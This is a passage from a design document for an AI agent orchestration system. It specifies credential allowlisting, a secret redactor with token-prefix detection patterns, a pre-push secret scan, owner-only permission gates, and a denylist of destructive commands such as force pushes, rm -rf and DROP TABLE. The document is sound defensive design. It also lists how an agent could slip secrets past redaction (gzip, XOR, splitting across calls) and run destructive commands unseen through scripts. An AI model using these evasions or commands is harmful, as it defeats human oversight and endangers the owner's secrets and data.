  `nodes/git_ops.py:15-28`, so `push_branch` and `clone_origin` still see the daemon's
  `SSH_AUTH_SOCK` and git config). Only the `LocalExecutor` spawn is allowlisted
  (`git_ops.worktree_executor`, `nodes/git_ops.py:243`, is a `LocalExecutor` construction
  site, so it is covered, but it has no other caller in `src/rework`: the coder's executor is
  the `LazyExecutor`, `nodes/tools.py:101`, which builds a `LocalExecutor` in `attach`; and
  it is not the engine's git either). The engine's own PR creation and pushes are therefore
  unaffected.
  For role commands:
  - **An exported `GH_TOKEN` (or `GITHUB_TOKEN`) stops reaching a role's `gh`** until it is
    registered as a credential with that `env_name` and an allow rule. A `gh` that is
    logged in through its own config file under `HOME` keeps working, with no credential
    and no audit row (the file channel, point d). `docs/ops.md:121-122` documents `gh auth
    status` logged in as the setup, which is the config-file case, so for the owner's
    deployment this is the likelier one. The phase 1 live exit criterion is written around
    exactly this (section 13).
  - **Verified in the source as used by existing code:** `PATH` (`role_env` itself reads it);
    `uv run` in role worktrees (`gc.py` module docstring) needs `HOME` and uv's cache,
    both on the baseline; the Postgres test suite reads `REWORK_TEST_POSTGRES`
    (`tests/conftest.py:26-29`, `.github/workflows/ci.yml:44`), so a role cannot run it
    against Postgres until the owner adds that name to `role_env.toml`. It carries a
    password, and a `REWORK_*` name cannot be a credential's `env_name`, so allowlisting
    it is the only route and is the owner's explicit trade; a role that runs the `rework`
    CLI relies on `REWORK_DB`, `REWORK_TOKEN`, `REWORK_DAEMON_URL`, `REWORK_HTTP_PORT`
    (`config.py:91`, `cli/__init__.py:254`, `orchestrator/workspace.py:104`, `:188-189`),
    all dropped: with them gone the CLI falls back to the default sqlite path
    (`config.py:68-69`), which for a Postgres daemon is a different database.
  - **Not read by any rework source, but plausible for the commands roles run, so the
    owner must add them if needed** (none is on the baseline; the grep of `src/rework`
    for `GH_TOKEN`, `SSH_AUTH_SOCK`, proxy variables and `UV_*` reads found none, the only
    `UV_` hit being the constant `UV_TIMEOUT_S`, `update.py:32`): `SSH_AUTH_SOCK` (an agent
    socket is a capability, not a path, which is why it is opt-in), `GIT_SSH_COMMAND`,
    `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY` and lowercase forms (a proxy URL can embed a
    password; without them a role on a proxied host loses network access), `SSL_CERT_FILE`
    and `REQUESTS_CA_BUNDLE`, `UV_INDEX_*`/`PIP_*` (index URLs can embed tokens), and
    any `*_TOKEN` a project's tests expect.
- **(g) Named tests, in phase 1** (section 13): `test_role_command_cannot_see_provider_keys_or_db`
  and `test_injected_credential_visible_only_in_the_granted_call`, plus the allowlist
  unit tests listed there.

### 5. Redaction

**One primitive, many choke points.** A `Redactor` (new module, e.g.
`src/rework/security/redact.py`) holds a process-wide needle set and exposes
`redact_bytes`, `redact_text` and `redact_json` (walks dicts/lists, redacts every string
leaf). It is greenfield: no code in `src/rework` does this today.

**What it holds.** (a) Every credential value: the daemon decrypts all credentials into
process memory at startup and on a change (it polls `credentials.rotated_at`/row count).
That resident copy, its lifetime and what cannot be wiped are the first item of the
single plaintext-lifetime statement in section 4; the set is never written anywhere. A
vault that is `locked` holds no credential needles (the WARNING says so). (b) Values injected into the current command, added for the
duration of the call even if (a) missed them. (c) The provider keys: the values of the
variables named by `api_key_env` in `models.json` (`kernel/llm/catalog.py:33`, `:60`) and
of every `REWORK_*_KEY` in the environment, as **redact-only** needles. They stay where
they are (section 10). Since the section 4 allowlist a role command no longer inherits
them, so these needles are belt-and-braces: they catch a key read from a file, or one the
owner re-adds to the allowlist, and are no longer the only thing between a role and a
provider key in its environment.

**How values are matched.** Each value `v` of length >= 8 yields needles:

| form | needle |
|---|---|
| exact | `v` |
| base64 | standard and URL-safe, padded and unpadded, at all three byte alignments (so a value embedded inside a larger base64 blob is caught) |
| hex | lower and upper case |
| percent-encoded | `urllib.parse.quote(v, safe="")` |
| JSON-escaped | `json.dumps(v)[1:-1]` |
| shell-quoted | `shlex.quote(v)` |
| partial | for `len(v) >= 24`: its first 12 and last 12 characters as separate needles |

All needles are compiled into one alternation sorted longest-first and applied to the
whole buffer. The replacement is `[REDACTED:<credential-name>]` for exact and encoded forms
and `[REDACTED]` for partial and provider-key hits. Values shorter than 8 characters are
exact-match only and the TUI marks them "weak"; creation warns that short values cannot be
redacted reliably. Entropy is **not** used to redact command output (it would shred git
SHAs and hashes). It is used only for detection of a pasted secret, below.

**Detection of a pasted secret (chat and gate answers).** A detector flags a message that
contains: a known prefix shape (`ghp_`, `github_pat_`, `gho_`, `sk-`, `sk-ant-`, `AKIA`,
`xox[abp]-`, `glpat-`, `npm_`), a PEM `-----BEGIN ... PRIVATE KEY-----`, a JWT shape, a
`password=`/`token=`/`secret=` assignment with a long value, a database URL with a
password, or any whitespace-free token of >= 20 chars with Shannon entropy >= 4.0 bits/char
and at least three character classes. It is tuned for recall; the owner can override a
false positive (section 9).

**On a host that is not the daemon (the owner's Mac TUI).** There is no private key
there and no plaintext credential value, so "redact every value rework holds" cannot be
done by value matching on that host, and this ADR does not pretend otherwise. What
actually runs there:

| layer | on the daemon host | on a TUI-only host |
|---|---|---|
| exact-value needles (section 5 table above) | all credential values, injected values, provider keys | **none for credentials**; provider-key needles only for keys that happen to be in that machine's own environment or `rework.env` |
| shape rules (known prefixes, PEM, JWT, `password=`/`token=` assignment, database URL with a password) | yes, in addition | **yes: this is the whole redactor there**, applied at render and at the `RedactingStore` in that process |
| entropy rule | detection only (chat/gate answers), never redaction | detection only (chat interception before send) |

The false-negative rate is therefore not zero and is not measured: a secret with no
recognised prefix or assignment context (a random password, a bare 32-hex token, an
internal service token, a passphrase) passes the shape rules; the entropy rule catches
long mixed-class random tokens at chat interception but not short, dictionary-like or
low-entropy secrets. The test corpus pins current behaviour in both directions so the gap
is a tracked fact. What the daemon side adds is the **exact-value guarantee where values
actually appear**: a credential value can only reach rework's output through a command that
ran on the daemon host with the value injected, so every path that handles command output,
events, the tool-loop transcript, logs, artifacts and reports written by daemon-side
processes is matched by value. What it cannot add is anything for text typed on the Mac
(a pasted token in chat): that is stored and sent to the model provider from the Mac
process, protected only by the detector's interception and the owner's override choice.
Remedy when that fails is the provider-side one: rotate the secret.

**Where it hooks in** (the choke points, in the order data flows):

| path | real code | hook |
|---|---|---|
| command output | `nodes/tools.py:218` (`communicate`), `:224` (timeout partial), `:227-233` (decode + truncate) | `redact_bytes(out)` **before** decode and truncation: the 4000+4000 char cut can no longer split a value into two unmatchable halves |
| command string | `nodes/tools.py:216`, `_register_command` writes it to a JSON file (`:359`) | redact the string before registering; the model's own command may embed a pasted value |
| tool-loop transcript | `nodes/toolloop.py:436` (appended), `:131` (`_save_loop` to disk) | `redact_json(messages)` at append and again at save |
| trajectory events | `nodes/toolloop.py:224-236` (`emit`), `:428` (`tool_result`) | `redact_json(payload)` in `emit` |
| every event | `InProcessEventBus.publish` (`kernel/events/bus.py:37`) | `redact_json(event.payload)` before `append_event` |
| persisted records | `StateStore` is a Protocol (`kernel/state/store.py`); `append_event`, `create_gate`, `decide_gate`, run artifact via `update_run`, `append_chat_message` | a `RedactingStore` decorator around either backend, applied where the store is opened, so SQLite and Postgres get it once |
| logs | `JsonFormatter.format` (`logs.py:60-79`) and the console formatter (`logs.py:106`) | redact `msg` and `exc` |
| reports | `_render_md` (`cli/__init__.py:582`) and the TUI's report render | redact the rendered text (the `_render_md` side in phase 1; the TUI render in phase 3) |
| Library writes | `curation.contribute` (`library/curation.py:152`), before `write_body` (`:215-217`) | redact `body`/`description`: reports and memories are written to the mirrored repo |
| PR title/body | `engine._create_pr` (`orchestrator/engine.py:758`), `pr_create` (`nodes/gh.py:15-55`; title and body are argv at `:33-36`) | last-mile `redact_text(title)`, `redact_text(body)` in `_create_pr` before it calls `pr_create` |
| chat to the model | `OrchestratorChat.send` (`orchestrator/chat.py:405`), `_history` (`:434`), recorded at `:437` | the detector refuses a pasted secret before `:431`; stored and displayed text is redacted by value **only where the process holds values** (see the next subsection for a host that does not) |
| TUI transcript | `tui/views/work.py:465` and the gate/report views | redact on render too (defense in depth; on a host without values this is the shape rules only, below); this hook is TUI work and lands in phase 3 |

**Streaming vs buffered.** `run_command` buffers the whole output (`communicate()`), so
matching is over a complete buffer and needs no state. Any future streaming path must hold
back the last `max_needle_len - 1` bytes of each chunk until the next chunk arrives; a
test pins this so the first streaming feature cannot regress it.

**Limits (stated, not hidden).** The redactor cannot catch: a value that was transformed
other than as listed (gzip, XOR, ROT13, reversed, split over several lines or commands,
one character per call, spelled out in prose, an image); a value shorter than the
minimum; a secret rework does not hold (a token the repo contains that was never
registered). On binary output the byte-level pass still removes ASCII needles, but the
later `decode(errors="replace")` (`nodes/tools.py:227`) means an encoding of the value
inside compressed or non-UTF-8 data is not recognized. Truncated output is redacted
first, so truncation cannot split a value; partial needles catch fragments from another
cutter. Redaction is a safety net behind "the model never has the value", not the primary
control; for the environment channel the primary control is the allowlist (section 4).

**Commit contents: the pre-push scan covers every engine push path (phase 2: it opens a
gate, which phase 1 does not have).** A command could
write a value into a file (`printenv > x`) that the handoff then commits. The engine pushes
a branch from exactly two places, and both end in `git_ops.push_branch`
(`nodes/git_ops.py:225`): `_deliver_branch` (`orchestrator/engine.py:630`, pushes at
`:659`, called after an approved ship gate, `:599-601`, for a git-origin mission whose
project `results` setting is `push_branch` or `both`, with `push_branch` the default,
`:637-642`) and `_create_pr` (`:758`, pushes at `:803`).
An earlier draft of this section named only `_create_pr`, which left the default path
unscanned. The scan is a single new helper, `scan_outgoing(worktree, branch)` in
`nodes/git_ops.py`, called by one new engine method `_push_checked(...)` that both sites use
instead of calling `push_branch` directly. It matches the **added lines and commit
messages of every commit being pushed** (`git log -p --format=%B <branch> --not
--remotes`, i.e. commits no remote already has) against the redactor's needles and the
detector. On a hit nothing is pushed: the engine opens a permission gate (`reasons:
["push: diff contains a secret-shaped value"]`, location only, never the value). Allow
(a false positive) pushes and writes a `push_override` audit row; Deny or timeout does
not push, `_deliver_branch` reports it through the same "pushing failed" path it already
uses for a failed push, and `_create_pr` returns without a PR.

**Which pushes are not scanned (precisely):** (1) any `git push` a role runs itself
through `run_command`: the engine never sees that diff; the command policy (section 8)
asks about force, protected-branch and delete pushes, not about content; (2) a mission with
no `repo_origin`, or a project whose `results` setting is `fetch`: `_deliver_branch`
returns before pushing (`:635-642`) and the patch returns over the workspace transport
(ADR 0005) for the owner to review; (3) pushes the owner makes
outside rework; (4) anything already pushed before this exists. The scan also only
recognises values rework holds and shapes the detector knows (the limits above).

### 6. The policy model and its evaluation order

**Rule.** One row of `permission_policies`:

- `subject_type` and `subject_id`: a credential, skill or tool by Library item id, or the
  sentinel `subject_id = '*'` for every item of that type. Command rules are
  `subject_type='command'`, `subject_id='*'`. The column is `NOT NULL`; **NULL has no
  meaning** and a row with a NULL (a hand edit; the DDL forbids it) is treated as
  malformed (below). The same sentinel is what the TUI editor writes for "all skills" and
  what the migration writes for the default skill/tool rules.
- `effect`: `allow | deny | ask`. `approval` (`never | first_use_per_mission |
  every_use`) is meaningful only for `allow`; `ask` is shorthand for allow with
  `every_use`; `deny` stores `never` and ignores it. **Command rules are a denylist:**
  only `deny` and `ask` are accepted for `subject_type='command'`; to silence a default
  command rule the owner retires or edits it (an `allow` command rule would be a whitelist
  hole and is rejected on save).
- `scope`: a JSON object with **all five keys mandatory** (`projects`, `roles`, `models`,
  `providers`, `missions`), each a list or the explicit string `"*"`:

```json
{"projects": ["p-ab12"], "roles": ["coder"], "models": ["*"],
 "providers": ["anthropic"], "missions": ["*"]}
```

  Within one rule the dimensions combine with AND; inside a dimension the list is OR.
  `projects` match `Mission.project_id`; `missions` match mission ids; `roles` match the
  role name; `models` and `providers` match the model and provider of the run that is
  asking. A dimension that lists specific values never matches a request that has no
  value for it (`None`; the MCP server, below); only `"*"` does.
- **Malformed rules fail closed, in the direction that denies.** A rule is malformed when
  a scope key is missing or unknown, the JSON of `scope` or `matcher` does not parse,
  `subject_id` is NULL, `status` is not in {`active`, `proposed`, `retired`} (a hand edit to
  `'Active'` or a typo would otherwise skip the rule silently, `git push --force` included),
  or the combination is invalid (for example `effect=allow` on a
  command rule). Saving one is rejected. If one is found in the table, what "closed" means
  depends on the subject, because the two defaults differ (next subsection):
  - **Credential, skill and tool subjects (default deny).** A malformed `allow`/`ask` rule
    is **non-matching**, so the default denies. A malformed `deny` rule **matches every
    request for its `subject_type`** (an unreadable deny must not silently become no rule).
  - **Command subjects (default allow, a denylist).** "Non-matching, so the default
    denies" is **false here**: the default is allow, so a non-matching malformed `ask` rule
    (a hand edit, a corrupt matcher, including the seeded `git push --force`) would
    silently become no rule and the command would run ungated. So for commands **a
    malformed rule is a hit, never a miss**: a malformed `deny` rule is a deny-class hit
    and a malformed `ask` rule is an ask-class hit, on every `run_command`, because the
    matcher that said which commands it meant is exactly what cannot be read and so cannot
    be narrowed. A command rule whose `effect` itself cannot be read cannot be classed as
    ask or deny, and is treated as deny-class (the stricter). The gate or denial names it (`rule <id> is malformed`). This is noisy on
    purpose: it stays noisy until the owner repairs it with `rework permissions list
    --malformed` then `edit` or `retire`, or `rework permissions reset-defaults --repair`
    (which replaces a malformed `source='default'` row from the shipped seed).
  Only `status='active'` rows are evaluated; `proposed` and `retired` rows never match. A
  row whose `status` is none of the three is not "retired by accident": it is malformed and
  resolves by the two bullets above (for a command rule, a hit), so a mis-cased status can
  never turn a rule off.

  **The two failure modes, stated once.** They differ and both fail closed. (1) A command
  rule that *can be read as a command rule* but is malformed (corrupt `matcher` JSON, a bad
  `status`, a bad scope) is a **hit of its own class**: an `ask` rule is an ask-class hit
  (one gate naming the rule, `rule <id> is malformed`), a `deny` rule a deny-class hit, and
  an unreadable `effect` is deny-class; the call is gated or refused, and the rest of the
  rule set is still evaluated. (2) A row or a read the loader **cannot classify at all**
  (a database error, an unknown rule shape) makes the command policy unreadable and
  **denies the whole call**, a plain `ls` included (step 5 below). Neither is ever a
  skipped rule.

**Two kinds of subject, two defaults.** This resolves the apparent conflict between "no
matching rule means deny" and "an ordinary command is not asked about":

- **Command policy is a denylist.** A `run_command` whose command matches no `deny` or
  `ask` rule is **allowed** (with the advisory-jail caveat of section 8). Nothing is
  asked about `ls`.
- **Credential, skill and tool subjects are an allowlist.** With no matching `allow`
  rule the request is **denied by default**.

**Evaluation order**, for a request `R = (subject_type, subject_id, role, project, model,
provider, mission, command)`. A `run_command` with `credentials=[...]` evaluates the
credential subject (steps 1-4) once per named credential and the command policy (step 5)
once; the results are combined at the end. The first step that yields a result ends
evaluation *of that subject*:

1. **Availability.** Item missing, not `ACTIVE`, or (credential) the vault cannot
   decrypt it: `unavailable` (section 3). No gate.
2. **Explicit deny.** Any matching `effect=deny` rule (including a malformed deny rule,
   above): **deny**. A deny beats every allow regardless of specificity; only the owner
   editing policy lifts it. No gate.
3. **Scope match.** Collect matching `allow`/`ask` rules (`subject_id` equal to the item
   or `'*'`, scope matching). None: **default deny**. Credentials have no default rule,
   so a credential nobody wrote a policy for is unusable. Skills and tools get one default
   `allow`/`never` rule per type (`subject_id='*'`, all five scope keys `"*"`), inserted
   by the phase that starts evaluating them (section 13), so existing behaviour does not
   change until the owner edits it.
4. **Approval mode.** Among all matching rules, the **strictest** wins (`every_use` >
   `first_use_per_mission` > `never`; `ask` counts as `every_use`). Two matching rules
   therefore never produce a quieter result than either alone, and a narrow `allow` cannot
   punch through a broader `ask`; that is intentional.
   - `never`: allow.
   - `first_use_per_mission`: allow if a `permission_grants` row exists for `(mission,
     rule, subject)`, else ask; the Allow decision inserts the grant (keyed on the
     concrete item id). The grant covers any later command of that subject in that
     mission within scope; `every_use` exists for the owner who wants each command seen.
   - `every_use`: ask.
5. **Command policy** (section 8; phase 2, there are no command rules in phase 1): for
   every `run_command`, with or without credentials,
   match the command against active `command` rules. `deny`: deny. `ask`: ask. A malformed
   rule (including a bad `status`) is a hit of its own class (above). No match, **after a successful read of the
   rules**: no restriction from this step (allowed). An error reading the command rules
   (database error, unknown rule shape the loader cannot classify) **denies the call**
   (`denied: command policy unreadable`), including a plain `ls`. There is no cached
   last-known-good rule set to fall back on, because a stale cache is a fail-open path.

**Combining.** `deny` from any subject or from the command policy denies the call.
Otherwise, if any subject or the command policy says `ask`, **one** gate is opened
listing every reason (so a credential rule and a command rule produce one gate, not two).
Otherwise the call proceeds. `unavailable` for any named credential fails the whole call
with that reason; the command is not run without it.

**Fails closed at each step.** Step 1: undecryptable means unavailable, never "try without
it". Steps 2-3: any error reading policy (DB error, unknown subject type) denies with the
reason, never allows; a malformed rule resolves as described above. Step 4: a missing or
unreadable grant row asks. **Step 5 (command policy):** an error reading the command rules
denies, and a malformed command rule is a deny or ask hit; step 5 is the one place where
"found nothing" means allow, so it is the one place where a failed read is checked
separately from an empty result (an empty result after a successful read is allowed, a
failed read is not an empty result). The grant lookup failing asks, and the audit write
failing denies. A gate that times out or whose owner cannot be reached denies (section 7).
There is no code path from an error to an allow.

**Skills and tools: what "use" means, and where it is enforced.** A skill is a
procedure and a Library tool is a body of code the agent then runs through `run_command`;
rework serves them as text and cannot observe a model "following" a skill. The one
mechanical event that can be policed is **serving the body**, so that is what "use" means
here, and it is enforced at the two code paths that serve a body. Both return a denial
instead of the body; `library_search` / `search` and the spawn menu
(`LibraryHandle.menu`, `library/tools.py:43-59`) stay unfiltered:

- **`library_read` inside a role.** The call reaches `LibraryAwareExecutor.execute`
  (`library/tools.py:232-233`) and then `LibraryHandle.read_text` (`:80-95`). Because
  `PermissionExecutor` is the outermost wrapper (section 4), it sees
  `library_read(item_id)` first. It resolves the id or ref with the same
  `LibraryHandle.resolve` (`:68-78`), evaluates steps 1-4 for `(skill|tool, item_id)`
  with the run's role, project, model, provider and mission, and on `deny`, on a gate that
  is denied or times out, or on `unavailable`, returns `denied: <reason>` **without
  delegating inward**: the body is not read and `record_use` is not called. An allowed
  read delegates unchanged. For credentials `library_read` returns the metadata page only
  (section 4, step 1), never a value, so it is never denied; a credential's use is the
  `run_command` path.
- **The MCP server's `get`** (`library/mcp.py:45-55`). It runs as `rework library-mcp`
  for an external harness over stdio: no role, run or mission, and no executor, so
  `PermissionExecutor` cannot cover it. It is covered by a policy callback passed to
  `build_mcp_server`: `get` evaluates steps 1-4 first with the pseudo-role `"mcp"` and
  `None` for project, model, provider and mission. By the matching rule above, a rule
  restricted to named roles, projects or models never matches the MCP caller, so the
  `allow` default (`'*'` everywhere) serves MCP exactly as today and any narrowed rule
  denies it. A result of `ask` is a denial for MCP (`denied: this item needs owner
  approval inside a mission`; there is no mission to hang a gate on). If the policy store
  cannot be read, `get` denies for skills, tools and credentials and still serves reports
  and memories. `search` is unchanged.
- **Not covered, stated plainly.** The owner's own reads (CLI, TUI) are not policed.
  `library_items.body` and the git mirror are readable by anyone with the store or the
  files (section 11). A body a role was already served, or has learned another way, can be
  used without any further event; there is no revocation. `library_search` still returns
  the name and description of a denied item. The scope on a skill or tool therefore
  controls *who is served the body*, nothing more.

**What policy is not.** It is not the mechanism that picks which Library items an agent
sees (settled decision 4). It does not filter `library_search`, the spawn menu or MCP
`search`: an agent can still discover an item it may not use, and then fails at the read
or at the gate with a clear denial, and can ask the owner for access with
`ask_orchestrator`. Visibility (status, relevance) and permission (may this role be
served or use this, now) stay separate mechanisms so a policy bug can neither hide an
item nor, by hiding it, pretend to protect it.

### 7. Gates and the audit trail

**The gate.** The wrapper opens a gate through `GateManager.request`
(`kernel/gates.py:87`) with `kind=GateKind.PERMISSION`. No new gate kind: the TUI already
renders Allow / Deny (`tui/views/gates.py:48`) and the decision is an approved bool plus
an optional note (`kernel/state/records.py:58`). The question is human text:
`coder (run r-… on claude-sonnet) wants credential 'github-token' (GH_TOKEN) to run:
gh pr list --state open`.

**Replay safety (CLAUDE.md hard rule 4).** A role's tool loop is saved to disk after each
tool batch and resumed after a restart (`_save_loop`, `nodes/toolloop.py:126-134`), so the
call that was waiting on a gate runs again. Two facts constrain the design: the executor
interface sees only `(name, args)`, not the tool-call id (`executor.execute(tc.name,
dict(tc.arguments))`, `nodes/toolloop.py:420`), and `GateManager.request` mints a random
gate id (`kernel/gates.py:99`), so the id cannot be derived. The wrapper therefore uses the
existing lookup pattern (`spec["_call"]`, `orchestrator/agent.py:1232-1240`): it computes
`call_hash = sha256(run_id | tool name | canonical args JSON)` (the `call_hash` column of
every audit row) and `call_key = sha256(call_hash | k)`, where `k` is the number of
**terminal** audit rows already written with that `call_hash`. A terminal row is one whose
outcome is `started` (or `allowed`, for a `library_read` that has no started/finished
pair), `denied` or `timed_out`. The wrapper stores `call_key` in
`spec["permission"]["call_key"]` and, before opening a gate, looks through
`list_gates(mission)` for a PERMISSION gate with that key. An `open` gate is waited on; a
decided gate with no terminal row yet is **unconsumed** and is reused, and its decision is
honoured (Allow: write `started` and run; Deny or timeout: write the `denied`/`timed_out`
row and return the refusal). Once a terminal row exists the gate is consumed, `k` has
advanced, and the next identical command needs a fresh gate. So a restart never opens a
second gate for the same pending call, and a decision is never spent twice.

**Decision: a denial is not sticky; a retry asks again.** Counting `denied` and
`timed_out` rows in `k` is a deliberate choice. A gate answers "may this run this command
now", not "may it ever". If a denied or timed-out gate stayed unconsumed, every later
identical command in the run would be refused forever with no new gate, and the owner
could never change their mind (or come back from being away: a timeout would become a
permanent refusal) short of aborting the run. The cost is that a model that loops on the
same command asks again each time; that is bounded by the tool loop's own turn budget and
softened by the owner's note, which is returned in `denied: <note>` ("do not retry, use
X"). An owner who wants a standing no writes a `deny` rule (section 6, step 2), which
needs no gate and is the sticky mechanism by design. The one case where a denial is
re-served rather than re-asked is the crash window between the decision and the terminal
row, and the case where the audit write itself fails (which denies the call anyway).

**Where the payload rides: `spec`, no migration.** The gates table has no scope or
resource columns, and the decision is to leave it that way:

```json
{"asked_by": "engine", "detail": "matched: rule pr-01, rule default-git-push",
 "permission": {"v": 1, "subject_type": "credential", "subject_id": "l-…",
   "subject_name": "github-token", "env_name": "GH_TOKEN", "role": "coder",
   "run_id": "…", "project_id": "…", "model": "…", "command": "gh pr list",
   "mode": "every_use", "rule_ids": ["…"], "reasons": ["credential", "command: git push"]}}
```

Reasons: (1) `spec` is already free-form JSON in both stores (`kernel/state/sqlite.py:82`,
`postgres.py:93`), passed through by `GateManager.request` (`kernel/gates.py:104`, `:115`)
and read by the TUI (`tui/views/gates.py:259-264` reads `spec["detail"]` and
`spec["asked_by"]`). (2) Nothing needs to *query* gates by scope: queryable history is
the audit table, which has real columns. (3) A migration would be an `ALTER` on both
stores plus a backfill for rows nothing reads. The `command` in the spec is already
redacted. The `spec["v"]` field makes the shape versionable.

**Who may decide.** Only the owner. Today decisions arrive from exactly two places: the
TUI, which writes the store directly (`tui/data.py:302`, store-only per ADR 0006), and the
CLI (`GateManager.decide`, `cli/__init__.py:965`). The orchestrator LLM has **no tool that
decides a gate** today: it answers a run's *escalation* (`answer_escalation`,
`orchestrator/agent.py:235`, handled at `:805` by `_answer`, `:1201`; the escalation path of
`nodes/escalate.py:1`), not gates. This ADR
keeps it that way and adds two tripwires: `GateManager.decide` gains an `actor` argument
and refuses any actor other than the owner for a gate whose `spec` carries `permission`
(marked `asked_by="engine"`, the marker the turn-cap gate already uses,
`orchestrator/agent.py:1310`); and a test pins that the orchestrator's tool set contains no
gate-deciding tool, so adding one is a visible, failing change. A hard stop that another
model can click through is not a stop. Anyone who can write the `gates` table can still
flip a decision; that is the DB-writer row of section 11.

**Timeout and denial.** The deadline is `gate.created_at + REWORK_PERMISSION_TIMEOUT_S`
(default 1800), derived from the row, not process uptime, in the spirit of CLAUDE.md hard rule 5 (which
puts wait deadlines in graph state; this one lives in the gate row because the wrapper
blocks inside a tool call rather than at an `interrupt()`, and the row is the source of
truth, hard rule 3). On
timeout the wrapper records `decision_note="timed out"`, status denied, and returns
`denied: permission gate timed out; the command was not run`. On deny it returns
`denied: <note>`; on run abort (the run row no longer running) it returns the same stop
message `ask_orchestrator` uses. In every case the command is not executed, an audit row
records `denied` or `timed_out` (the terminal row that advances `k`, so a retry gets a
fresh gate, above), and the model sees a plain refusal with no hint of the value or how
to bypass.

**Audit trail.** `permission_audit` (section 1) is append-only and written by the engine,
never by a model. Actions: `use` (started/finished pair), `ask`, `grant`, `deny`,
`unavailable`, `create`, `rotate`, `retire`, `policy_change`, `chat_intercept`. Rows hold
who (`role`, `run_id`, `model`, `actor`), what (`subject_*`, redacted `command`,
`env_name`), the decision (`outcome`, `rule_id`, `gate_id`) and the result (`exit_code`).
Outcomes are `started`, `finished`, `allowed`, `denied`, `timed_out` and `unavailable`.
They never hold a value, a fingerprint of one, or its length. `rework permissions log
[--item NAME] [--mission ID]` shows the trail in a shell from phase 1; the TUI view
(section 9) is phase 3.

### 8. The destructive-command policy

**Honest framing first.** The `run_command` jail is documented as advisory, in the
`LocalExecutor` docstring (`src/rework/nodes/tools.py:131-136`):

> Known boundary (found live, first real eval run): the jail is ADVISORY for run_command.
> The shell starts inside the workdir, but a command may `cd` to an absolute path outside
> it and work there; inspecting the shell string is not a security boundary.

(the sentence at `:131-134`; `:134-136` adds that the real fix is the Docker executor,
M7). The destructive-command policy inherits that limitation in full. **It is a speed
bump against mistakes, not a sandbox.** It stops a model that is about to `git push -f`
by accident; it does not stop one that is trying to. The advisory disclaimer stays in
the docstring, gains a sentence pointing at this policy, and no document, prompt, gate or
TUI text may describe the policy as isolation or containment. The real containment is the
Docker executor, which this ADR does not replace.

**Default rules** (editable; see below):

| pattern | match |
|---|---|
| `git push --force` / `-f` / `--force-with-lease` / `+refspec` | parsed |
| `git push` to `main` or `master` (explicit, or implicit with HEAD on one) | parsed |
| `git reset --hard` on a branch that exists on a remote | parsed + `git branch -r --contains` |
| deleting remote branches (`git push --delete`, `git push origin :b`) | parsed |
| `rm -rf` / `rm -fr` / `rm -r -f` with a target outside the role's workdir | parsed + path resolution |
| `DROP` / `TRUNCATE` / `DELETE` without `WHERE` via `psql`, `sqlite3`, `mysql` | regex on SQL text |
| `kubectl delete`, `kubectl apply` | parsed |
| `terraform apply`, `terraform destroy` | parsed |
| `docker rm`, `docker rmi`, `docker system prune` | parsed |
| `systemctl stop`, `systemctl restart` | parsed |
| `rework update --target` (`cli/__init__.py:1543-1548`) | parsed |
| `ssh` / `scp` to a host not in the allowed-hosts list | parsed (host extraction) |
| `npm publish`, `twine upload`, `gh release create` | parsed |

**How matching works.** Prefer parsing over regex. The command is tokenized with `shlex`
and split into simple commands on `;`, `&&`, `||`, `|`, `&` and newlines; wrappers
(`sudo`, `env VAR=x`, `time`, `nohup`, `xargs`, `command`, `uv run`) are peeled; and
`bash -c '…'` / `sh -c '…'` payloads with a literal string are parsed recursively. Matching
is then on `argv`: the verb, the subcommand, flags (combined short flags like `-fu` are
expanded), and for `git`, `-C dir` / `-c k=v` options are skipped and `git config alias.*`
is consulted so an alias to a destructive verb is recognized. Regex on the raw string is
used only where there is no argv to parse: the SQL text handed to `psql -c`, `sqlite3 db
'…'`, `mysql -e`, or here-docs piped to them. `WHERE 1=1` and `WHERE true` count as no
`WHERE`.

**Ambiguous matches ask.** The policy asks (opens a permission gate with the reason
"could not determine whether this is destructive") when: the string cannot be tokenized
(unbalanced quotes); the command word is not a literal (`$CMD`, `` `…` ``, `eval`,
`bash -c "$x"`); a pattern's verb matches but its target cannot be determined (`git push`
with no refspec and an unresolvable upstream; an `rm -rf` target with a variable, glob or
`..` that cannot be resolved inside the workdir); SQL arrives from a file or stdin the
daemon cannot read (`psql -f x.sql`, `< dump.sql`); or the host of an `ssh`/`scp` is
non-literal. It does not ask for commands that match nothing (the command policy is a
denylist: an unmatched command is allowed, section 6): noise would train the owner to
click Allow.

**Where regex on the raw string is all we have, and what we do not see.** (a) SQL text,
above. (b) Anything inside a script or build target: `./deploy.sh`, `make release`,
`npm run publish`, `python -c "subprocess.run(...)"` are not inspected, because the
daemon cannot know what they do; they are *not* ambiguous matches, they are known misses.
(c) A command assembled across several calls (write a script, then run it). The policy
cannot see these, and the documentation says so; the owner who needs them covered adds a
`deny` rule for the script name or relies on the Docker executor.

**Editable defaults.** The list is seeded into `permission_policies` as
`subject_type='command'`, `source='default'` rows, with `matcher` JSON
(`{"kind": "argv", "argv": ["git","push"], "flags_any": ["-f","--force"]}` or
`{"kind": "sql", "verbs": ["DROP","TRUNCATE","DELETE"], "clients": ["psql","sqlite3","mysql"]}`)
and `effect=ask` by default. The owner can disable, change to `deny`, edit, or add rules
(CLI from phase 2: `rework permissions list --commands|edit`, with `retire` available since phase 1; TUI editor in phase 3,
section 9), and set the allowed ssh/scp hosts (stored as `allowed_hosts` in the matcher of
the `ssh`/`scp` rule; default empty, so even rewvis itself asks; the `ssh` host of a
target in `targets.toml`, `targets.py:55`, is not auto-allowed). `rework permissions
reset-defaults` restores missing default rows without touching owner edits;
`--repair` also replaces a *malformed* default row from the shipped seed (section 6).
A malformed or unreadable command rule never silently disappears: it asks or denies
(section 6). The command policy's "role's worktree" is the executor's `workdir`
(`nodes/tools.py:210`). The engine's own mechanical pushes (`_deliver_branch`, `_create_pr`) are trusted code,
not `run_command`, so this policy does not apply to them; they get the content scan of
section 5 instead.

**Keeping it honest.** (1) Ask on ambiguity, never allow. (2) The gate states which rule
matched, or that parsing failed, and the footer says "pattern check, not a sandbox". (3)
The test suite keeps a corpus of known evasions (script indirection, split-across-calls)
as documented `xfail` tests, so the limit is a tracked fact, not folklore. (4) The
existing `_check_leading_cd` (`nodes/tools.py:155`, called at `:200`) stays and stays
labelled advisory. (5) Nothing in rework's output or prompts says "blocked",
"contained" or "safe" about a command; it says "asked" or "denied by rule".

### 9. The TUI (`src/rework/tui/views/library.py`)

The TUI is store-only (ADR 0006), so it reads and writes the credential tables directly.
It holds the **public** key and cannot decrypt anything; there is no "reveal" action
anywhere, for anyone.

